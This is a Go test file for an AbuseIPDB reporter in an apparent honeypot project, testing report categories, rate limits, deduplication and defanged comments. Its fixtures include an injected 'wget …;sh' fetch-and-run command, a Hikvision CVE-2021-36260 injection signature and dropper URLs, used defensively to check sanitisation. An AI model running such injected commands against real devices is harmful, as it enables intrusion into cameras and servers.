package abuseipdb

import (
	"context"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/generalregulator/botbait/internal/metrics"
	"github.com/generalregulator/botbait/internal/model"
)

type fake struct {
	srv   *httptest.Server
	mu    sync.Mutex
	forms []url.Values
	hdrs  []http.Header
	codes []int
	calls atomic.Int32
}

func newFake(t *testing.T, codes ...int) *fake {
	f := &fake{codes: codes}
	f.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		n := int(f.calls.Add(1))
		_ = r.ParseForm()
		f.mu.Lock()
		f.forms = append(f.forms, r.PostForm)
		f.hdrs = append(f.hdrs, r.Header.Clone())
		code := 200
		if n <= len(f.codes) {
			code = f.codes[n-1]
		}
		f.mu.Unlock()
		if code == 429 {
			w.Header().Set("Retry-After", "1")
			if len(f.codes) > 0 && f.codes[0] == 429 && n == 1 && strings.Contains(r.Header.Get("X-Test"), "long") {
				w.Header().Set("Retry-After", "7200")
			}
		}
		w.WriteHeader(code)
		_, _ = w.Write([]byte(`{"data":{"ipAddress":"x","abuseConfidenceScore":1}}`))
	}))
	t.Cleanup(f.srv.Close)
	return f
}

func hikEvent(ip string) *model.Event {
	return &model.Event{
		SrcIP: ip, DstPort: 80, Protocol: "HTTP", Action: "HTTP PUT", Persona: "hikvision",
		Signature:  "Hikvision CVE-2021-36260 (webLanguage injection)",
		HTTPMethod: "PUT", HTTPPath: "/SDK/webLanguage", Timestamp: time.Date(2026, 10, 28, 12, 0, 0, 0, time.UTC),
		Techniques: []model.Technique{{ID: "T1059.004"}, {ID: "T1105"}, {ID: "T1190"}},
		IOCs:       model.IOCs{DownloadURLs: []string{"http://203.0.113.9:8080/a.sh"}},
		Downloads:  []model.DownloadResult{{Success: true, SHA256: strings.Repeat("ab", 32)}},
	}
}

func start(t *testing.T, f *fake, o Options) (*Reporter, *metrics.Metrics) {
	t.Helper()
	m := &metrics.Metrics{}
	o.Key, o.Base, o.Metrics = "KEY1234567890123456789", f.srv.URL, m
	if o.Sleep == nil {
		o.Sleep = func(context.Context, time.Duration) bool { return true }
	}
	r := New(o)
	r.Start()
	t.Cleanup(func() { r.Stop(2 * time.Second) })
	return r, m
}

func waitCalls(t *testing.T, f *fake, n int) {
	t.Helper()
	deadline := time.Now().Add(3 * time.Second)
	for int(f.calls.Load()) < n {
		if time.Now().After(deadline) {
			t.Fatalf("only %d calls, want %d", f.calls.Load(), n)
		}
		time.Sleep(5 * time.Millisecond)
	}
}

func TestReportContainsCategoriesDefangedCommentAndNoSensorData(t *testing.T) {
	f := newFake(t)
	r, m := start(t, f, Options{})
	ev := hikEvent("198.51.100.20")
	ev.HTTPPath = "/x?c=wget http://203.0.113.9/a;sh"
	if !r.Submit(ev) {
		t.Fatal("not queued")
	}
	waitCalls(t, f, 1)
	f.mu.Lock()
	defer f.mu.Unlock()
	form, hdr := f.forms[0], f.hdrs[0]
	if hdr.Get("Key") != "KEY1234567890123456789" || hdr.Get("Accept") != "application/json" {
		t.Errorf("headers %v", hdr)
	}
	if form.Get("ip") != "198.51.100.20" || form.Get("categories") != "15,20,21,23" || form.Get("timestamp") != "2026-10-28T12:00:00Z" {
		t.Errorf("form %v", form)
	}
	c := form.Get("comment")
	for _, want := range []string{"Hikvision CVE-2021-36260", "80/HTTP", "T1190", "hxxp://203[.]0[.]113[.]9:8080/a.sh", "Sample SHA256: " + strings.Repeat("ab", 32)} {
		if !strings.Contains(c, want) {
			t.Errorf("comment lacks %q: %s", want, c)
		}
	}
	for _, bad := range []string{"http://", "https://", "Host:", "192.0.2."} {
		if strings.Contains(c, bad) {
			t.Errorf("comment contains %q: %s", bad, c)
		}
	}
	if len(c) > maxComment {
		t.Errorf("comment length %d", len(c))
	}
	deadline := time.Now().Add(2 * time.Second)
	for m.AbuseReported.Load() != 1 && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	if m.AbuseReported.Load() != 1 {
		t.Errorf("metric %d", m.AbuseReported.Load())
	}
}

func TestOnlyPublicAddressesAreReported(t *testing.T) {
	f := newFake(t)
	r, _ := start(t, f, Options{})
	for _, ip := range []string{"127.0.0.1", "10.0.0.5", "192.168.1.9", "169.254.1.1", "0.0.0.0", "::1", "fe80::1", "", "not-an-ip", "100.64.0.1x"} {
		if r.Submit(hikEvent(ip)) {
			t.Errorf("%q must not be reported", ip)
		}
	}
	if f.calls.Load() != 0 {
		t.Fatal("a request was sent")
	}
	if !r.Submit(hikEvent("2001:db8::7")) {
		t.Error("public IPv6 must be accepted")
	}
}

func TestSameAddressIsReportedOncePerWindow(t *testing.T) {
	f := newFake(t)
	now := time.Date(2026, 10, 28, 12, 0, 0, 0, time.UTC)
	var mu sync.Mutex
	r, m := start(t, f, Options{Window: time.Hour, Now: func() time.Time { mu.Lock(); defer mu.Unlock(); return now }})
	if !r.Submit(hikEvent("198.51.100.20")) {
		t.Fatal("first report not queued")
	}
	waitCalls(t, f, 1)
	deadline := time.Now().Add(2 * time.Second)
	for m.AbuseReported.Load() < 1 && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	if r.Submit(hikEvent("198.51.100.20")) {
		t.Fatal("repeat inside the window was queued")
	}
	mu.Lock()
	now = now.Add(61 * time.Minute)
	mu.Unlock()
	if !r.Submit(hikEvent("198.51.100.20")) {
		t.Fatal("report after the window must be allowed")
	}
	waitCalls(t, f, 2)
}

func TestRateLimitRetriesAndLongLimitPausesReporting(t *testing.T) {
	f := newFake(t, 429)
	r, m := start(t, f, Options{})
	r.Submit(hikEvent("198.51.100.21"))
	waitCalls(t, f, 2)
	deadline := time.Now().Add(2 * time.Second)
	for m.AbuseReported.Load() < 1 && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	if m.AbuseReported.Load() != 1 {
		t.Fatalf("a 429 must be retried: reported=%d", m.AbuseReported.Load())
	}

	long := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Retry-After", "7200")
		w.WriteHeader(429)
	}))
	defer long.Close()
	m2 := &metrics.Metrics{}
	r2 := New(Options{Key: "KEY1234567890123456789", Base: long.URL, Metrics: m2, Sleep: func(context.Context, time.Duration) bool { return true }})
	r2.Start()
	defer r2.Stop(time.Second)
	r2.Submit(hikEvent("198.51.100.22"))
	deadline = time.Now().Add(2 * time.Second)
	for m2.AbuseErrors.Load() < 1 && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	r2.Submit(hikEvent("198.51.100.23"))
	time.Sleep(100 * time.Millisecond)
	if m2.AbuseReported.Load() != 0 || m2.AbuseSkipped.Load() < 1 {
		t.Fatalf("reporting must pause: reported=%d skipped=%d", m2.AbuseReported.Load(), m2.AbuseSkipped.Load())
	}
}

func TestRejectedKeyDisablesReportingAndDuplicateIsRemembered(t *testing.T) {
	f := newFake(t, 401)
	r, m := start(t, f, Options{})
	r.Submit(hikEvent("198.51.100.30"))
	waitCalls(t, f, 1)
	deadline := time.Now().Add(2 * time.Second)
	for !r.disabled.Load() && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	if !r.disabled.Load() || r.Submit(hikEvent("198.51.100.31")) || m.AbuseErrors.Load() != 1 {
		t.Fatalf("disabled=%v errors=%d", r.disabled.Load(), m.AbuseErrors.Load())
	}

	f2 := newFake(t, 422)
	r2, _ := start(t, f2, Options{})
	r2.Submit(hikEvent("198.51.100.32"))
	waitCalls(t, f2, 1)
	deadline = time.Now().Add(2 * time.Second)
	for {
		r2.mu.Lock()
		_, ok := r2.reported["198.51.100.32"]
		r2.mu.Unlock()
		if ok {
			break
		}
		if time.Now().After(deadline) {
			t.Fatal("a 422 (already reported) must be remembered, not retried")
		}
		time.Sleep(5 * time.Millisecond)
	}
	if f2.calls.Load() != 1 {
		t.Fatalf("422 was retried: %d calls", f2.calls.Load())
	}
}

func TestServerErrorsAreRetriedThenGivenUp(t *testing.T) {
	f := newFake(t, 500, 500, 500, 500, 500)
	r, m := start(t, f, Options{})
	r.Submit(hikEvent("198.51.100.40"))
	waitCalls(t, f, 4)
	time.Sleep(50 * time.Millisecond)
	if f.calls.Load() != 4 || m.AbuseReported.Load() != 0 || m.AbuseErrors.Load() != 4 {
		t.Fatalf("calls=%d reported=%d errors=%d", f.calls.Load(), m.AbuseReported.Load(), m.AbuseErrors.Load())
	}
	r.mu.Lock()
	pending := len(r.pending)
	r.mu.Unlock()
	if pending != 0 {
		t.Fatal("a given-up job must not stay pending forever")
	}
}

func TestStateSurvivesARestart(t *testing.T) {
	f := newFake(t)
	state := filepath.Join(t.TempDir(), "abuse.json")
	r1, m1 := start(t, f, Options{StatePath: state})
	r1.Submit(hikEvent("198.51.100.50"))
	waitCalls(t, f, 1)
	deadline := time.Now().Add(2 * time.Second)
	for m1.AbuseReported.Load() < 1 && time.Now().Before(deadline) {
		time.Sleep(5 * time.Millisecond)
	}
	r2 := New(Options{Key: "KEY1234567890123456789", Base: f.srv.URL, StatePath: state})
	if r2.Submit(hikEvent("198.51.100.50")) {
		t.Fatal("a restart repeated a report")
	}
	if fi, err := os.Stat(state); err != nil || fi.Mode().Perm() != 0o600 {
		t.Fatalf("state file %v %v", fi, err)
	}
	_ = os.WriteFile(state, []byte("{broken"), 0o600)
	if r3 := New(Options{Key: "k", Base: f.srv.URL, StatePath: state}); !r3.Submit(hikEvent("198.51.100.50")) {
		t.Fatal("a corrupt state file must be ignored")
	}
}

func TestSubmitNeverBlocksWhenTheQueueIsFull(t *testing.T) {
	block := make(chan struct{})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) { <-block }))
	defer srv.Close()
	defer close(block)
	m := &metrics.Metrics{}
	r := New(Options{Key: "k", Base: srv.URL, Queue: 2, Metrics: m})
	r.Start()
	done := make(chan struct{})
	go func() {
		for i := 1; i <= 20; i++ {
			r.Submit(hikEvent("198.51.100." + string(rune('0'+i%10)) + string(rune('0'+i/10))))
		}
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		t.Fatal("Submit blocked")
	}
}

func TestCategories(t *testing.T) {
	cases := []struct {
		name string
		ev   *model.Event
		want []int
	}{
		{"camera exploit", hikEvent("1.1.1.1"), []int{15, 20, 21, 23}},
		{"adb shell", &model.Event{Protocol: "ADB", Techniques: []model.Technique{{ID: "T1059.004"}, {ID: "T1105"}}}, []int{15, 20, 23}},
		{"telnet brute force", &model.Event{Protocol: "TELNET", Techniques: []model.Technique{{ID: "T1110.001"}}}, []int{18, 23}},
		{"generic web exploit", &model.Event{Protocol: "HTTP", Techniques: []model.Technique{{ID: "T1190"}}}, []int{15, 20, 21}},
		{"tr-069 soap", &model.Event{Protocol: "HTTP", HTTPPath: "/UD/act?1", Techniques: []model.Technique{{ID: "T1190"}}}, []int{15, 20, 21, 23}},
		{"nothing known", &model.Event{Protocol: "RAW"}, []int{15}},
	}
	for _, c := range cases {
		got := Categories(c.ev)
		if len(got) != len(c.want) {
			t.Errorf("%s: %v want %v", c.name, got, c.want)
			continue
		}
		for i := range got {
			if got[i] != c.want[i] {
				t.Errorf("%s: %v want %v", c.name, got, c.want)
				break
			}
		}
	}
}

func TestCommentIsBoundedCleanAndHasNoLiveLinks(t *testing.T) {
	ev := hikEvent("1.1.1.1")
	ev.Signature = strings.Repeat("S\x00\x1b", 400)
	ev.HTTPPath = "/p?u=https://evil.example.xyz/x%20y\nHost: 192.0.2.10"
	ev.IOCs.DownloadURLs = []string{"ftp://203.0.113.5/a", "http://203.0.113.6/b", "http://203.0.113.7/c"}
	ev.IOCs.NFS = []string{"203.0.113.9:/var/nfs → nfs.sh"}
	c := Comment(ev)
	if len(c) > maxComment || strings.ContainsAny(c, "\x00\x1b\n") {
		t.Fatalf("bad comment (%d): %q", len(c), c)
	}
	if strings.Contains(c, "evil.example.xyz") || strings.Contains(c, "http://") || strings.Contains(c, "https://") {
		t.Fatalf("live link in comment: %s", c)
	}
	if !strings.Contains(c, "nfs 203[.]0[.]113[.]9:/var/nfs") {
		t.Fatalf("NFS dropper missing: %s", c)
	}
}

func TestValidate(t *testing.T) {
	for code, wantErr := range map[int]bool{200: false, 429: false, 401: true, 403: true, 500: true} {
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.Header.Get("Key") != "goodkey" || !strings.HasPrefix(r.URL.Path, "/api/v2/check") {
				w.WriteHeader(418)
				return
			}
			w.WriteHeader(code)
		}))
		err := Validate(context.Background(), "goodkey", srv.URL)
		srv.Close()
		if (err != nil) != wantErr {
			t.Errorf("status %d: err=%v", code, err)
		}
	}
	if err := Validate(context.Background(), "k", "http://127.0.0.1:1"); err == nil {
		t.Error("unreachable server must be an error")
	}
}

func TestNilReporterIsHarmless(t *testing.T) {
	var r *Reporter
	if r.Submit(hikEvent("198.51.100.1")) {
		t.Fatal("nil reporter queued")
	}
	r.Stop(time.Millisecond)
}

func TestStopDrainsQueuedReportsAndDoesNotNeedTheDaemonContext(t *testing.T) {
	f := newFake(t)
	m := &metrics.Metrics{}
	r := New(Options{Key: "KEY1234567890123456789", Base: f.srv.URL, Metrics: m})
	for _, ip := range []string{"198.51.100.1", "198.51.100.2", "198.51.100.3"} {
		if !r.Submit(hikEvent(ip)) {
			t.Fatalf("%s not queued", ip)
		}
	}
	r.Start()
	r.Stop(3 * time.Second)
	if got := f.calls.Load(); got != 3 {
		t.Fatalf("shutdown dropped queued reports: %d of 3 delivered", got)
	}
	if m.AbuseReported.Load() != 3 || m.AbuseErrors.Load() != 0 {
		t.Fatalf("reported=%d errors=%d", m.AbuseReported.Load(), m.AbuseErrors.Load())
	}
}

func TestStopGivesUpOnAStuckServerWithinTheTimeout(t *testing.T) {
	block := make(chan struct{})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { <-block }))
	t.Cleanup(func() { close(block); srv.Close() })
	r := New(Options{Key: "KEY1234567890123456789", Base: srv.URL, Metrics: &metrics.Metrics{}})
	r.Submit(hikEvent("198.51.100.9"))
	r.Start()
	t0 := time.Now()
	r.Stop(300 * time.Millisecond)
	if el := time.Since(t0); el > 2500*time.Millisecond {
		t.Fatalf("Stop blocked for %s", el)
	}
}
